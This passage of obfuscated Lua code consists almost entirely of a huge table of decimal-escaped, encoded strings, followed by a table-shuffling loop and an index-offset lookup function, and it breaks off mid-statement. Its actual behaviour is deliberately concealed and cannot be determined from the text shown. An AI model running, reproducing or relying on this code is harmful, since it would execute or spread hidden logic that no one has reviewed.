51\075\116\048\068\108\101\087\050\113\111\075\119\087\074\061"";""\114\065\049\078\110\053\066\104\082\067\061\061"",""\097\117\054\066"",""\097\080\083\110\101\119\084\110\109\043\118\113\055\065\068\052"",""\101\068\049\090\105\049\073\099\047\120\071\065\118\088\115\071\082\115\050\115\103\068\090\103\112\083\120\117\085\122\061\061"",""\100\053\056\081\120\097\061\061"",""\110\065\053\097\081\083\048\080\109\055\087\121"";""\083\101\108\108\097\080\097\098\081\118\111\061"",""\057\065\086\072\057\053\083\113\106\078\105\061"";""\119\052\076\107\081\065\090\061"",""\117\053\116\056\073\109\086\088\090\073\098\061"";""\083\121\065\086\087\070\121\081\070\048\049\065\072\084\090\061"",""\105\043\068\054\101\043\118\113\105\065\083\116\101\119\083\098"",""\068\082\053\108\057\067\061\061"";""\087\051\097\106\057\100\057\100\075\049\076\061"",""\119\054\105\061"",""\057\114\075\078\120\065\113\101\047\069\084\076\070\114\102\072\079\068\101\061"";""\109\052\111\071\104\067\061\061"",""\104\066\114\066\085\114\107\078"";""\073\112\113\117\085\097\097\073\102\109\114\061"",""\080\081\056\085"",""\104\066\101\118\108\112\121\085\052\068\098\107\050\065\090\074"";""\101\047\107\079\119\076\061\061"";""\099\055\121\101"",""\098\048\111\070\086\112\053\074\086\072\102\107\071\105\114\047\078\106\085\056\121\122\061\061"";""\075\047\108\074"";""\097\051\083\053\070\068\079\051\099\075\100\051\109\109\055\055\055\078\054\061"",""\109\109\088\082\112\075\074\053\120\073\109\061"",""\112\098\082\103\086\088\111\061"";""\113\043\115\097\065\082\067\061"";""\047\085\113\052\113\054\083\122\113\111\102\089"",""\100\113\071\111\071\077\052\103\085\112\071\115\066\106\098\107"";""\081\097\114\080\048\107\049\067\115\079\104\108\088\069\118\115\116\067\061\061"",""\083\089\120\090\086\083\050\089\069\048\085\077\098\103\121\043"";""\074\081\065\069\109\074\098\090\070\117\054\079\122\057\111\086\065\075\113\076\084\099\119\111\053\097\061\061"",""\106\117\079\116\086\081\110\068\078\116\070\105\080\106\069\055\078\054\078\082\119\111\111\061"",""\057\065\075\089\106\065\109\061"",""\103\082\116\121\112\077\070\061"";""\047\098\086\101\085\112\043\098\098\110\109\061"";""\109\043\068\054"";""\053\080\122\115\047\097\114\061"";""\053\049\090\068"",""\055\086\097\107\074\078\066\119\111\077\084\086\071\053\085\067\072\089\089\090\056\104\075\090\065\122\114\061"";""\087\104\089\105"",""\097\080\083\110\101\119\084\110\109\043\068\107\057\065\110\116\106\067\061\061"",""\053\070\112\076\114\067\061\061"",""\051\072\065\114\076\065\104\103"",""\047\067\061\061"";""\110\090\080\055\087\108\100\115\074\104\049\055\068\115\074\061"";""\057\055\075\116"",""\052\053\087\087\084\100\069\100\107\097\061\061"",""\101\080\083\049\106\107\098\090\047\119\100\089\084\110\055\110\109\068\079\108"";""\071\053\076\111\090\118\075\121\050\075\114\080\066\071\097\077\110\122\100\103\120\057\068\056\108\097\051\077\113\053\105\078\118\083\051\105\121\055\122\061"";""\113\120\050\081\065\076\061\061"";""\053\086\073\088\114\116\083\053\066\069\070\100\043\113\098\089\055\104\049\071\078\048\079\079\052\090\086\085\106\074\104\119\082\085\113\090\099\108\110\114\101\082\102\055\053\099\082\074\099\053\074\078\122\053\066\067\081\048\119\043\114\100\047\101\108\122\061\061"",""\097\080\083\110\101\119\084\110\068\043\110\104\055\065\086\080"",""\068\051\068\103\079\098\113\076\079\121\057\113\055\051\068\081\070\067\061\061"",""\104\067\066\108\077\067\061\061"";""\087\104\070\117\077\073\065\052\067\097\061\061"",""\120\097\081\073\119\122\061\061"",""\082\118\103\102\048\102\043\097\112\122\061\061"",""\048\081\071\076\121\076\061\061"";""\084\109\110\055\109\054\097\054\120\054\050\114\101\099\121\116"";""\079\069\089\118\083\102\057\100\066\055\078\119\105\081\043\107\110\088\099\090\081\069\076\061"",""\067\076\061\061"";""\090\049\122\110\098\106\073\090\052\051\079\050\077\054\067\061"";""\050\122\080\054\072\067\061\061"";""\101\043\086\104\101\043\075\054"";""\109\079\052\048\098\075\097\050\089\087\109\061"";""\098\070\080\048\074\053\075\069\108\119\119\122\085\067\070\088\057\050\076\056\082\073\114\049\108\070\100\089\081\119\066\119\065\071\089\056\098\068\079\049\099\119\081\049\097\090\122\043\080\103\084\104\048\076\076\043\117\074\112\087\113\054\052\112\105\106\109\090\087\065\122\065\116\115\112\047\047\108\109\113\107\111\048\050\116\043\069\085\120\104\080\109\110\089\118\115\118\115\109\061"";""\070\070\122\084"";""\085\110\098\121\088\114\056\066\053\048\090\061"";""\051\084\080\050\117\067\051\088\121\099\087\109\067\081\101\114\080\072\114\121"",""\084\043\068\054\097\043\118\113\055\099\112\054\120\099\097\061"";""\073\077\078\065\049\079\082\051\050\099\097\078\057\076\061\061"";""\079\121\115\050\106\098\113\084\071\098\112\100\077\051\100\104\077\114\108\061"",""\105\071\077\082\103\080\113\054\083\121\101\105\114\056\052\108\087\074\107\082"";""\048\074\076\083\056\074\101\088\065\098\067\097"",""\077\119\057\078\057\114\076\080\055\080\100\043\109\069\079\078\105\097\061\061"",""\085\100\073\115\089\047\069\056\103\097\061\061"";""\066\103\107\083\048\068\121\088"",""\053\111\079\099\081\097\061\061"";""\051\104\069\052\105\097\061\061"";""\077\083\072\056\053\107\118\056\070\104\112\056\110\052\097\087\069\106\102\110\071\077\050\080\052\056\074\086\103\105\085\112\088\115\048\118\068\055\088\075\057\081\098\090\120\107\086\099\097\121\068\118\108\068\090\057\122\083\101\070\116\081\103\087\118\079\049\049\116\120\098\090\055\054\051\085\102\103\079\087"",""\121\043\083\053\105\067\061\061"";""\106\109\100\069\055\053\084\119\109\099\110\114\070\110\115\108\077\080\114\061"";""\084\102\090\086\075\056\073\070\080\108\054\061"";""\117\120\057\067\080\115\049\047\102\111\067\061"";""\078\049\071\098\106\097\072\118"",""\086\088\084\110\087\112\115\099\043\109\115\073\054\106\049\056\088\118\102\061"",""\118\114\082\114\097\076\061\061"",""\053\054\068\113"";""\071\121\056\084\117\097\061\061"",""\068\051\097\043\077\065\086\082\097\110\098\052\109\119\055\117"",""\112\099\106\065\043\104\090\061"",""\104\104\075\110"";""\051\109\088\078\105\097\061\061"",""\057\114\113\087\109\099\100\076\084\043\113\065\084\078\113\115\101\103\109\061"";""\106\068\114\090\077\121\083\089\120\069\100\102\097\068\115\048"";""\106\087\113\107\118\047\087\079\098\053\104\050\103\078\053\069\083\067\061\061"",""\055\078\118\116\106\080\108\061"";""\076\100\079\111\109\052\111\072\069\073\050\121\086\110\118\084\090\100\100\108\049\080\053\043\117\043\086\088\082\073\071\119\100\065\055\047\097\067\061\061"",""\089\113\106\052"";""\078\048\098\076\108\076\061\061"";""\115\073\104\081\053\082\066\047\075\122\117\053\100\076\061\061"";""\071\114\098\043\099\119\113\049\097\072\108\072\057\065\100\084\120\122\061\061"";""\105\080\084\052\077\099\112\103"",""\085\055\104\067\082\084\078\120\043\122\048\114\104\067\061\061"";""\086\089\112\108\076\051\068\069"",""\108\106\078\068\056\076\061\061"";""\077\119\115\100\077\119\083\072"",""\111\054\052\081\121\111\107\109\076\067\061\061"";""\112\071\117\073\084\055\051\072\069\069\050\050\106\079\068\098\082\066\077\081\065\068\111\066\082\108\114\084\104\076\061\061"",""\105\098\089\111\119\105\106\098"";""\090\086\078\073\112\057\051\120\110\097\061\061"";""\120\110\079\081\051\098\084\110\101\043\086\098\055\097\061\061"";""\112\066\068\086\052\069\109\089\072\115\120\113\081\066\070\061"";""\082\099\047\071\071\071\087\100\110\076\110\120\084\114\116\086\106\116\117\054\107\119\099\067\090\076\098\119\110\049\121\108"";""\106\114\084\104\055\109\083\077\079\103\098\072\068\072\115\048\120\067\061\061"";""\050\118\055\050\083\097\102\061"";""\072\085\070\083\115\073\098\120"";""\114\115\088\057\110\122\061\061"",""\067\054\079\090\073\101\115\086\071\069\047\073\056\117\080\085\075\115\122\061"";""\069\066\067\050\104\053\085\116\052\122\048\080\048\052\085\119\117\122\061\061"";""\089\106\118\084\103\089\114\061"",""\102\122\069\117\097\067\061\061"";""\114\065\118\120\112\097\061\061"";""\120\099\112\072\057\065\075\104\101\043\109\061"";""\065\119\115\116"",""\119\121\086\113\106\078\084\110\071\122\061\061"",""\121\103\056\076\071\056\114\080\108\070\115\073\117\079\056\083\050\076\061\061"";""\098\087\050\069\122\055\052\115"",""\119\101\084\114"";""\088\068\055\086\105\122\061\061"";""\105\065\079\100\106\065\076\061"";""\081\114\111\067\078\099\055\070\104\075\067\061"";""\065\050\108\109\055\103\043\082\114\101\115\070\081\119\090\056\104\048\067\099\069\097\061\061"";""\053\105\066\047\107\067\061\061"",""\108\118\081\120"",""\056\067\116\090\107\051\113\097\050\072\097\061"";""\057\112\079\074"";""\071\050\078\098\043\085\066\050\103\122\110\106\081\109\065\112\104\078\112\112\107\056\067\089\087\055\086\050\120\056\089\068\115\057\108\050\122\079\055\072\055\115\051\103\100\075\071\052\077\116\054\075\078\052\054\100\107\100\073\087\085\043\108\070\054\071\055\077\070\085\073\097\056\089\077\069\048\099\080\103\082\070\079\073\109\097\061\061"";""\056\090\079\077"",""\049\084\079\121\053\074\073\112\085\120\047\070\076\070\068\065\109\105\106\066\047\074\051\069\089\066\112\077\048\080\066\103\073\056\104\081\057\068\084\109\087\067\072\070"",""\112\072\122\070\081\120\122\061"";""\084\099\112\121\106\097\061\061"",""\052\097\099\088\116\067\061\061"",""\106\080\070\061"",""\084\070\120\088"";""\097\110\115\090\120\121\057\113\105\051\068\116\099\098\083\116\055\076\061\061"";""\051\078\097\073\073\078\087\101\070\109\100\086\108\076\099\122"",""\112\106\121\047\073\055\081\118\087\109\068\090"",""\114\047\112\115\113\117\066\052\097\122\120\111\067\117\069\103"";""\057\121\067\090\071\068\083\119\051\119\084\087\079\110\068\048\109\099\111\061"",""\120\053\084\054\105\114\057\110\057\122\061\061"";""\084\043\068\054\109\043\068\052\057\078\110\107\055\097\061\061"",""\108\051\090\055\122\084\115\084\074\113\111\053\100\078\090\118\097\090\083\106\068\114\111\103\107\115\115\047\117\056\076\120\107\067\110\105\054\053\078\079\080\101\102\061"";""\120\081\067\115"",""\055\068\049\114\086\113\101\120\052\117\050\110\106\051\086\074\110\099\070\061"";""\057\065\086\104\057\099\121\089\055\119\108\061"",""\100\076\055\083\079\102\105\075\080\066\047\083\077\105\081\088\097\084\120\099\111\107\106\067\110\072\090\061"";""\105\106\121\081\079\097\061\061"",""\100\078\089\122\076\067\061\061"",""\068\043\075\113\057\114\055\116\105\098\079\102\077\099\118\098"",""\082\097\117\077\053\108\119\106"",""\049\121\043\079\085\055\052\069\106\067\061\061"",""\083\083\067\048"";""\098\099\086\089\054\113\065\068\108\076\103\115\087\076\102\112\102\106\082\049\085\076\061\061"";""\114\106\110\086\114\081\074\061"",""\109\121\067\118\055\065\118\104\070\098\079\055\084\119\057\102"",""\097\078\107\100\101\110\112\052\087\047\100\100"",""\109\043\111\076\099\110\084\050\077\065\108\072\105\054\057\072\105\080\109\061"",""\120\110\068\104\109\114\084\049\051\119\097\076\079\110\108\080"",""\105\118\108\078\049\082\118\090\122\077\106\081\117\110\088\072\108\080\102\073\078\080\043\085"";""\083\101\100\090\120\076\061\061"";""\081\076\072\090"";""\106\068\115\103\106\068\114\112\097\121\057\056\055\119\097\072"";""\056\111\050\081\066\098\089\050\101\067\061\061"";""\109\043\068\054\097\043\086\052\055\097\061\061"",""\047\085\101\099\074\081\057\116\107\082\099\056"",""\048\081\076\085\069\100\117\084\110\087\088\073\117\097\061\061"",""\120\051\104\108\114\079\114\061"";""\088\083\071\112\102\113\053\066\122\117\097\106\056\047\082\105\080\067\061\061"";""\113\084\078\070\070\089\117\086\107\104\110\056\090\067\061\061"",""\083\072\049\072\088\117\120\048\105\077\097\083\079\109\048\104"";""\113\122\061\061"";""\119\111\066\074\106\080\119\081\050\113\088\108\119\122\061\061"",""\051\109\054\043\077\065\090\052\077\072\068\081\101\078\070\080\077\076\061\061"",""\080\089\050\051"",""\066\067\122\074\085\082\110\082\105\115\047\117\081\049\100\097\119\069\104\071"",""\080\047\098\078\071\121\118\097\086\068\122\051\077\067\061\061"";""\115\084\118\076\069\080\089\048\114\049\079\081\055\088\047\079"";""\119\121\086\050\055\119\084\100\057\065\075\089\106\065\109\061"",""\097\121\115\110\079\053\084\068\068\068\057\119\068\099\110\056\079\097\061\061"";""\066\101\113\112\071\087\079\077\113\082\115\052\070\076\061\061"",""\109\108\102\122\051\097\101\119"";""\086\075\081\054\074\069\088\107\051\049\053\066\110\057\057\055\099\056\118\090\081\066\105\074"";""\121\090\113\110\097\067\051\109\066\115\108\061"",""\109\110\097\076\071\109\101\076\051\099\110\104\057\075\084\049"",""\090\099\108\051"",""\107\105\079\054\076\071\074\061"",""\084\104\068\097"",""\089\084\109\119\056\049\106\057\116\114\070\122\113\081\098\090\115\104\079\103\066\072\108\097\121\110\075\100\078\055\043\121\117\115\071\122\079\122\061\061"";""\104\107\082\089\069\069\076\099\070\097\061\061"";""\119\050\066\103\050\084\098\121\075\071\088\121\101\057\075\067\101\067\118\097\111\097\061\061"";""\057\065\075\072\077\076\061\061"",""\054\050\073\098\090\067\077\121\111\090\114\073\077\121\069\100\055\047\071\055\069\117\110\108"",""\076\049\075\069\055\097\108\061"";""\080\070\057\118\102\122\067\089\075\102\090\098\115\048\111\077\049\065\105\099\113\115\117\110\121\053\073\076\097\082\110\082\101\086\043\054\107\122\061\061"";""\121\073\069\109\101\103\120\098\074\122\061\061"";""\088\107\081\076\107\097\061\061"",""\120\068\079\072\068\114\054\121\097\054\075\081\051\054\057\075\077\068\070\061"",""\049\088\070\113"";""\088\056\097\076\109\074\073\077\100\053\105\110"";""\103\048\097\110\067\110\068\087\086\080\083\108"";""\052\112\103\043\104\097\061\061"",""\106\068\115\075\120\051\083\083\120\054\098\052\077\065\055\089\077\099\108\061"";""\108\047\120\051\098\101\107\097\114\121\108\061"";""\066\053\055\104\051\085\050\047\122\051\071\073"";""\081\043\066\098"";""\078\109\069\122\111\086\098\068\100\118\098\108\054\043\074\061"";""\086\088\105\100\101\122\061\061"",""\057\098\100\089\071\099\068\080\068\121\113\084"";""\053\073\090\084\051\081\084\107\108\119\105\098\050\112\052\104\109\108\106\057\054\066\086\098\106\076\061\061"",""\105\103\106\049"",""\072\047\108\066\055\067\061\061"";""\055\119\083\052\106\080\108\061"";""\088\107\122\088\085\083\097\065\082\067\061\061"";""\089\108\066\120"",""\106\072\087\056\085\102\097\066\118\085\122\061"",""\115\114\081\086\054\098\120\065\120\114\073\117\084\068\068\053\048\122\061\061"",""\079\072\100\120\068\109\084\101\068\099\057\117\105\099\057\083\084\097\061\061"";""\100\049\098\111\110\069\108\100\051\073\090\061"",""\116\067\108\110\079\106\079\097\052\083\081\114\049\112\054\061"",""\068\119\078\051\066\097\061\061"",""\088\068\104\055\102\120\082\050\083\067\061\061"",""\054\070\104\078\070\056\107\065\121\073\067\061"";""\110\055\069\085"";""\117\104\105\111"";""\052\070\081\052\113\099\057\054\073\088\118\098"";""\053\049\053\077\051\097\072\106"",""\047\043\080\048\065\104\090\076\088\104\082\098\106\111\084\074\087\115\078\074\109\113\057\073\101\074\105\061"",""\088\069\119\083\048\085\105\120\089\097\061\061"";""\099\118\087\121\051\051\108\061"";""\119\085\117\108\086\088\115\119\056\100\104\115\087\107\088\078\054\074\099\048\111\067\061\061"";""\111\075\083\074\105\053\050\105"",""\103\107\066\051\047\102\054\061"",""\106\099\075\054\077\122\061\061"";""\101\043\100\100\105\067\061\061"",""\104\073\077\052\068\067\061\061"",""\085\118\106\121\108\051\081\105\115\108\076\061"",""\073\086\049\099\114\073\065\088\067\079\111\061"",""\100\070\076\097\084\101\109\081\089\079\072\100"",""\071\065\068\119\051\043\121\097\079\103\057\055\120\080\068\119"";""\100\101\085\122\113\051\081\112\075\048\057\110"";""\083\057\078\114\075\054\099\111\119\067\061\061"",""\121\101\048\116\111\072\100\097\065\048\074\082\099\079\055\097\082\076\061\061"";""\106\105\050\109\056\106\101\061"";""\103\079\055\104\050\068\076\061"",""\122\111\102\106\083\102\086\083\084\104\122\115\080\055\055\070\086\102\054\061"";""\075\107\054\061"";""\080\104\121\083\121\067\061\061"";""\056\109\077\106"",""\069\083\049\097\056\109\081\053\050\065\043\115\088\078\089\053\099\099\122\061"",""\072\056\102\114\048\048\077\075\086\104\069\111\050\071\108\077\050\047\087\116\083\111\043\051\077\089\113\120\110\087\050\068\078\122\083\051\120\122\061\061"";""\051\072\054\108\088\073\051\057"";""\097\082\050\051\089\076\061\061"",""\057\065\110\107\077\076\061\061"",""\074\104\119\057\056\052\052\101\080\101\047\110\122\119\097\071\115\098\106\099\097\043\108\079\071\097\061\061"",""\080\065\112\055\110\116\104\073\069\104\080\114\097\097\061\061"",""\066\084\097\057\055\098\121\071\099\097\121\047\082\069\084\075\048\052\107\098\079\097\061\061"";""\083\119\119\074\083\112\047\122\119\077\108\061"";""\078\079\066\111\112\067\061\061"",""\076\099\110\055\107\097\061\061"";""\049\106\090\071\090\099\081\108\121\111\111\112\069\089\112\109\076\054\101\061"";""\047\089\067\110\055\048\102\113\047\067\061\061"",""\106\065\086\100\055\053\079\054\105\078\110\104\055\076\061\061"",""\090\109\084\110\111\119\105\106\087\053\117\088\071\119\069\087\100\111\071\071\069\053\088\115\053\078\050\102\117\111\097\061"";""\097\080\083\110\101\119\084\110\109\065\075\052\101\099\057\052\101\119\115\102"";""\076\082\111\078"";""\074\115\115\119\053\083\054\049\114\079\083\107\072\114\067\113\089\067\061\061"";""\105\051\057\101\070\099\084\118\106\114\102\043\051\098\118\090\099\099\067\061"",""\115\054\043\119\056\070\065\109\114\050\085\104\117\076\061\061"";""\100\107\113\069\107\122\061\061"",""\107\098\080\102\108\084\076\057\112\084\108\072\079\083\083\057\104\098\090\061"";""\106\069\114\061"";""\072\087\107\088\108\065\106\070"";""\052\088\071\104\110\097\061\061"";""\100\067\089\088\065\100\083\047\075\054\072\081\079\069\050\079"",""\113\043\078\105\077\088\048\119\086\076\061\061"";""\103\105\122\073"",""\107\048\048\087\097\075\109\061"",""\113\072\085\102\072\076\061\061"",""\119\057\053\083"";""\088\051\052\047\112\085\114\061"",""\119\121\086\074\055\099\090\061"",""\101\103\110\054\055\097\061\061"",""\075\070\089\109\103\089\108\061"";""\068\043\110\117\105\114\110\100\068\103\055\087\120\068\079\074\101\067\061\061"";""\115\078\107\072\047\118\069\108\071\118\108\055\051\120\116\074"";""\109\107\115\078\068\043\100\047\057\080\083\078\105\043\068\119\051\076\061\061"",""\056\057\101\070\106\076\061\061"";""\120\115\080\069\056\076\061\061"",""\118\114\043\066\081\074\072\110\078\056\105\121\101\109\054\053\053\054\120\081\087\107\111\055"";""\084\074\109\097\116\082\081\075\049\048\105\116\057\118\081\084\083\078\101\061"",""\080\100\087\052\074\090\047\114\107\067\061\061"";""\056\115\115\084\087\115\102\061"";""\108\055\073\070\084\051\113\067\111\122\061\061"";""\080\116\122\084\106\107\097\077\083\085\107\071\101\113\057\119\088\081\110\049\110\079\067\054\097\121\067\061"",""\067\078\049\084\067\074\076\048\069\050\103\069"";""\071\097\080\087\053\120\071\087\105\122\061\061"",""\068\053\056\116\043\089\103\056\103\122\061\061"",""\100\122\067\075\077\079\047\079\081\111\105\114\076\109\077\112\087\069\115\120\051\106\057\087\089\104\054\077\079\114\122\061"";""\115\102\075\067\075\102\104\098\043\076\112\072\043\110\078\075\051\084\115\074\080\053\105\083\075\097\061\061"",""\111\053\089\109"",""\088\097\049\047\084\097\061\061"";""\112\111\065\118\121\067\061\061"",""\084\057\085\066\082\067\061\061"",""\086\077\101\071\098\120\050\047\115\122\072\070\088\067\061\061"",""\116\082\047\120\056\122\061\061"",""\083\069\055\119\080\048\077\098\097\056\102\061"";""\101\097\066\084\097\066\099\073\121\115\090\061"";""\084\078\110\104\055\114\055\113\105\103\079\054\097\043\100\113\106\065\084\081\055\098\079\074\101\119\079\072"";""\077\106\098\073\088\111\086\103\104\071\076\114\084\076\061\061"",""\079\087\105\106\088\057\085\113\082\043\076\052\099\122\061\061"";""\085\115\109\048\051\084\098\055\097\079\101\061"",""\051\078\086\054\077\099\055\112"";""\057\090\047\079"";""\112\086\119\085\077\070\049\085\048\101\100\108"";""\051\111\084\083\052\081\108\072\084\116\074\061"",""\099\076\107\055\100\047\087\099\098\103\053\066\110\102\111\101\106\106\052\100\080\076\061\061"",""\086\109\073\068\117\117\104\078\051\078\097\061"",""\050\074\088\110\112\083\106\055\078\079\098\061"";""\076\082\052\090\050\080\118\080\053\097\061\061"",""\121\055\109\065\104\065\070\061"";""\066\077\100\099\070\110\053\100\056\102\067\061"",""\122\084\074\056\077\076\061\061"",""\076\083\104\120\080\067\061\061"",""\084\065\068\072\057\053\083\116\071\097\061\061"";""\119\097\120\098\067\106\082\043\043\067\061\061"",""\110\089\057\080\099\065\054\067\083\077\118\109\049\081\043\053\082\109\081\073\069\097\061\061"";""\089\099\083\098\048\122\061\061"",""\110\107\112\076\119\078\080\104\107\108\086\067\086\083\082\100\099\051\110\072\078\097\061\061"";""\055\084\120\097\068\098\081\117\065\122\061\061"";""\057\055\072\090\088\080\110\072\102\079\116\098"";""\073\105\119\070\068\050\112\047\054\049\103\105\088\097\061\061"",""\051\048\043\056\052\112\111\061"",""\105\054\081\067\049\073\105\061"";""\068\103\110\116\068\043\084\118\070\068\100\107\105\109\050\087\084\103\070\061"",""\084\068\070\053\118\068\078\080\122\067\061\061"",""\065\108\099\106\100\076\090\085\121\122\043\072"",""\102\103\109\057"",""\084\109\118\112\106\107\100\109\077\078\057\104\051\098\084\101"";""\052\077\097\067\084\106\117\082\075\105\078\069\068\112\098\081\088\076\061\061"";""\074\043\077\097\087\122\061\061"",""\047\049\089\105\077\103\043\115\112\081\065\086\068\076\061\061"";""\071\122\080\066\100\117\056\100\055\052\116\086\068\066\066\116"";""\074\088\077\068\052\069\054\061"",""\077\098\055\083\079\080\057\065\070\053\083\054\051\075\083\077"",""\057\065\100\068"";""\104\052\049\065\100\111\101\086\119\076\061\061"",""\043\054\057\119\080\081\110\113\103\067\072\085\104\110\102\080\076\073\049\117\050\112\104\078"";""\121\121\080\119\119\101\050\116"";""\109\103\079\055\109\098\118\115\105\114\108\080\120\098\118\100\109\076\061\061"",""\115\117\075\052\079\101\056\082\108\067\043\117\119\114\090\099\065\122\061\061"",""\077\075\079\116"",""\107\056\110\120\078\072\105\056\097\117\097\061"";""\071\109\079\102\055\109\054\043\071\078\113\072\084\051\068\119\057\109\098\061"",""\097\043\086\104\106\078\068\107\057\122\061\061"";""\084\043\068\054\084\065\068\072\101\043\068\104\055\065\075\104\057\053\070\061"";""\118\070\100\048\119\085\089\072"";""\055\065\048\082\079\077\048\074\117\065\098\070\086\065\108\072\104\102\055\057\108\097\070\113"";""\109\119\079\119\070\069\083\080\070\053\110\056\106\043\118\112\101\109\102\061"",""\099\068\117\069\086\066\082\066\072\070\043\068\075\122\061\061"",""\078\109\077\101\047\100\115\116\105\112\100\103\118\051\079\086\085\097\061\061"",""\047\073\050\119\074\118\053\048\081\111\097\097\117\106\121\056\111\074\081\111\090\106\081\108\082\121\048\114\051\043\073\116\051\118\056\069\106\077\068\043\112\072\111\068"";""\054\085\047\068\113\069\055\050\049\047\101\061"";""\068\098\086\043\101\109\101\052\068\072\068\080\079\053\055\074"",""\099\116\116\047\086\104\069\108\114\065\112\113"",""\116\113\106\116\052\111\105\089\055\085\112\108"";""\068\065\075\050\105\065\068\052\108\114\084\110\057\065\068\107\057\065\068\098\108\097\061\061"",""\117\079\088\121\118\067\061\061"";""\048\052\106\047\065\122\061\061"";""\097\078\114\116\088\098\071\121\048\074\111\061"",""\067\057\108\083\047\083\086\074\114\116\086\056\087\083\086\081\090\122\061\061"",""\089\048\076\077\121\097\061\061"",""\105\072\073\098"";""\115\076\117\067\052\055\110\079\116\081\105\061"",""\120\119\079\115"";""\111\097\061\061"",""\087\048\103\122\047\122\061\061"",""\051\067\119\106\051\080\076\061"",""\107\075\108\078\067\097\084\115\053\082\109\117"",""\055\075\087\100\048\116\087\080\119\120\053\053\073\088\102\061"";""\050\080\105\086\051\078\051\047\098\103\090\087"",""\108\084\077\075\078\085\043\074\077\065\087\051\076\074\108\084"";""\068\099\112\089\097\078\055\075\068\103\122\080\099\098\086\056\079\099\108\061"",""\086\053\050\072"",""\071\075\119\106\069\056\070\047\081\076\061\061"";""\105\078\068\050\106\080\055\110"";""\099\098\121\104\078\097\061\061"";""\084\078\110\104\055\114\055\113\105\103\079\054\097\043\100\113\106\065\097\061"";""\069\115\104\097\103\075\122\061"",""\055\080\079\121\101\067\061\061"";""\089\077\079\079\083\067\061\061"",""\054\118\076\107\052\066\070\061"";""\070\112\114\084\055\067\061\061"",""\070\121\108\080\077\043\076\076\084\051\057\115\055\121\055\108\070\097\061\061"";""\079\053\098\043\051\099\070\080\055\098\118\049\099\114\055\099\057\122\061\061"";""\072\099\072\122\071\117\043\119\103\076\061\061"";""\070\090\105\076\107\071\108\061"";""\109\081\084\112\098\115\076\061"",""\101\066\081\049\122\119\068\117\113\085\065\115"",""\068\043\075\113\057\122\061\061"";""\115\117\100\049\047\122\061\061"";""\055\065\121\110\106\078\057\089\070\053\079\090\109\098\076\080"";""\109\050\054\088\068\067\061\061"",""\108\082\121\048\075\078\070\061"";""\083\108\108\089\120\070\081\113"",""\114\112\112\113"";""\121\122\109\043\099\088\050\106\049\048\055\122\117\106\111\061"";""\052\118\120\118\103\097\061\061"",""\098\116\108\116\048\097\061\061"";""\108\113\101\070\085\108\069\078\048\107\101\061"",""\106\065\068\104"",""\102\103\057\081"",""\049\066\114\090\099\087\054\076\050\108\120\099\100\049\054\061"";""\109\110\051\121\097\076\061\061"",""\088\069\071\097\073\122\061\061"";""\049\050\082\082\105\098\102\043\098\067\061\061"";""\112\100\085\121\086\067\078\100\081\103\075\077\108\043\054\098\086\116\067\054\054\052\070\061"",""\111\052\057\048\084\070\050\118\106\085\090\084\082\076\061\061"",""\053\056\110\109\112\082\078\119\084\086\078\070\116\083\085\047"",""\122\112\054\089"";""\100\065\081\049\072\101\052\067\071\051\080\071\066\086\084\104\082\057\069\102\119\097\061\061"",""\051\051\074\099\065\111\106\077\076\121\102\073\115\056\075\110\068\108\057\097\065\065\074\061"";""\074\080\110\067\071\075\048\098\110\090\066\114\043\090\047\057\106\105\057\120\073\076\061\061"",""\071\122\047\049"",""\120\109\084\119\087\120\114\061"";""\097\043\100\100\106\078\057\110\109\080\084\100\057\065\109\061"";""\122\101\072\098\099\108\085\106\057\085\113\079\097\115\067\076\098\108\111\061"",""\112\104\122\086\089\054\079\069\103\065\108\061"",""\106\120\116\053\106\088\074\090\109\076\110\086\116\067\117\102"",""\110\055\043\080\118\057\049\047\070\055\081\104\118\080\069\080"";""\118\106\049\051\087\053\087\112\104\048\078\051\101\051\100\071\053\116\116\105\085\112\056\052\102\111\118\077\107\053\112\101"",""\055\043\121\100\057\065\079\102"";""\076\081\057\079"";""\068\108\050\102"",""\097\080\083\110\101\119\084\110\068\065\075\089"",""\051\097\078\122\074\122\077\116\085\052\074\105\119\082\086\102\114\117\080\105\051\067\061\061"";""\067\087\097\119\086\089\098\079\109\065\117\086\052\070\074\098\055\111\068\048\120\086\075\115\112\065\072\088\108\054\068\050\078\077\112\100\113\075\112\048\050\117\051\110\073\047\083\048\068\078\090\048\082\079\087\108\073\109\080\052\121\057\107\117"",""\070\082\109\054\069\116\074\051\052\043\069\081\088\110\047\113\110\057\101\104\057\049\098\121\052\099\066\106\106\114\083\050\073\107\069\075"",""\097\076\079\051\087\055\118\101\114\106\108\061"";""\120\054\055\071\118\097\077\098\090\057\109\061"",""\118\088\057\119\052\122\061\061"",""\077\106\108\070\116\076\109\048\047\100\110\098\084\087\070\108\119\100\067\086\055\122\061\061"";""\066\106\090\051"",""\119\066\084\107\078\115\052\065\122\101\057\111\070\089\111\061"",""\109\052\084\088\043\077\056\111\050\122\061\061"",""\107\076\061\061"";""\121\085\052\089\081\076\098\052\087\122\108\061"";""\067\119\065\057\081\047\071\051\068\097\061\061"",""\056\119\054\108"",""\113\103\054\100\073\079\101\061"",""\082\077\077\055\088\075\084\077\069\101\077\089\104\111\081\099\043\110\111\061"";""\066\116\043\067\076\072\049\110\085\102\122\065\116\067\061\061"",""\057\099\112\076\101\099\079\049"";""\074\076\108\076\065\076\061\061"";""\053\084\113\116\109\099\066\053\043\121\121\119\054\054\079\047\104\082\111\118\117\088\070\102\072\048\070\061"";""\077\122\061\061"",""\055\078\118\054\057\103\083\055\120\069\110\052\070\121\100\114"";""\110\050\113\114"",""\070\108\069\078\108\109\074\077\085\098\090\117\083\054\114\115"",""""}for z,C in ipairs({{-653027-(-653028),190966-190415};{1032761+-1032760;-861255+861440};{232730-232544;-818138+818689}})do while C[-184305+184306]<C[81329+-81327]do d[C[-257653-(-257654)]],d[C[-842594-(-842596)]],C[-98170+98171],C[741340-741338]=d[C[-539985+539987]],d[C[972689+-972688]],C[79614-79613]+(-405553-(-405554)),C[-745865+745867]-(10832-10831)end end local function z(z)return d[z+(-700056-(-724146))]end do local 